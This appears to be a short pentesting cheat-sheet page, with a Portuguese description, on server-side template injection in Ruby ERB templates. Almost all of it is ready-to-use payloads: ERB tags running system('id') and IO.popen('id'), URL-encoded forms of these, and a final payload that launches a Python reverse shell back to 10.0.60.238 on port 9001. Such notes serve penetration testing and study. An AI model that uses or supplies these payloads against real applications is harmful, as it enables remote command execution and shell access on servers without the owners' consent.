---
description: Parece um command injection
---

# SSTI ERB (RUBY)

[https://docs.ruby-lang.org/en/2.3.0/ERB.html](https://docs.ruby-lang.org/en/2.3.0/ERB.html)\
\
irb

'id'

'whoami'&#x20;



```
<%= system('id') %>
```

URL ENCONDE

```
%3C%25%3D%20system%28%27id%27%29%20%25%3E
```

```
<%= IO.popen('id').read() %>
```

URL ENCODE

```
/%3C%25%3D%20IO.popen%28%27id%27%29.read%28%29%20%25%3E
```

{% code overflow="wrap" %}
```
<%= IO.popen({'RHOST' => '10.0.60.238', 'RPORT' => '9001'},['python3', '-c', 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")']).read %>
```
{% endcode %}

